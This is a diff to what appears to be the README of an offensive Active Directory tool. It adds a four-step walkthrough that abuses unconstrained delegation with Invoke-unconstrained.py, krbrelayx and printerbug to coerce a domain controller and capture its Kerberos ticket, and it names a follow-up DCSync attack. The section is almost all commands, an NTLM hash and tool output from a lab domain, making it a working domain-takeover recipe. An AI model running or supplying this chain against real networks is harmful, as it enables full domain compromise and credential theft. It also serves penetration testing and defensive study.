@@ -42,6 +42,38 @@ As can be seen above, on each exploitation, a state file is created which shows 
 
 #### Full Exploitation: 
 
+Step 1:  
+```bash
+Invoke-unconstrained.py -u LABS\DEG$ -p aad3b435b51404eeaad3b435b51404ee:fd8d7a6f868dc2d81aaf3eb3a9ea6adc -t DEG$ -ah ATT30.labs.local -aip 192.168.117.134 192.168.117.131
+```
+Step 2 \(This step get executed automaticly if you are on Linux, you might need to use aesKey if kerberos encrypts ticket with that\): 
+```bash
+python3 krbrelayx.py -hashes aad3b435b51404eeaad3b435b51404ee:fd8d7a6f868dc2d81aaf3eb3a9ea6adc
+[*] Servers started, waiting for connections
+```
+
+Step 3:
+```bash
+python3 printerbug.py LABS/DEG\$@192.168.117.131 -hashes aad3b435b51404eeaad3b435b51404ee:fd8d7a6f868dc2d81aaf3eb3a9ea6adc ATT30.labs.local
+[*] Impacket v0.12.0.dev1+20231027.123703.c0e949fe - Copyright 2023 Fortra
+
+[*] Attempting to trigger authentication via rprn RPC at 192.168.117.131
+[*] Bind OK
+[*] Got handle
+DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
+[*] Triggered RPC backconnect, this may or may not have worked
+```
+
+Step 4: 
+```bash
+[*] SMBD: Received connection from 192.168.117.131
+[*] Got ticket for DC01$@LABS.LOCAL [krbtgt@LABS.LOCAL]
+[*] Saving ticket in DC01$@LABS.LOCAL_krbtgt@LABS.LOCAL.ccache
+```
+
+
+After the fourth step, we have obtained a ticket of the domain controller and now we can perform a DCSync attack.  
+
 
 ### Credits
 
